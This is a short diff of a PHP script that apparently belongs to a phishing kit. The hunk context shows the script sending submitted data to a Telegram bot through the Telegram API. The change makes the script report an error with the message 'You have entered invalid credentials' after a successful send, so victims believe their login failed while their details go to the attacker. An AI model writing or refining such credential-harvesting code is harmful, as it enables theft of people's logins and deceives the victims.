@@ -30,9 +30,10 @@ $response = file_get_contents($telegramApiUrl . "?chat_id=$chatId&text=" . urlen
 
 // Return success or error message as JSON
 if ($response) {
-    echo json_encode(["status" => "success", "message" => "You have entered invalid credentials. Please try again."]);
+    echo json_encode(["status" => "error", "message" => "You have entered invalid credentials. Please try again."]);
 } else {
     echo json_encode(["status" => "error", "message" => "Network error, please try again."]);
 }
 ?>
+
 
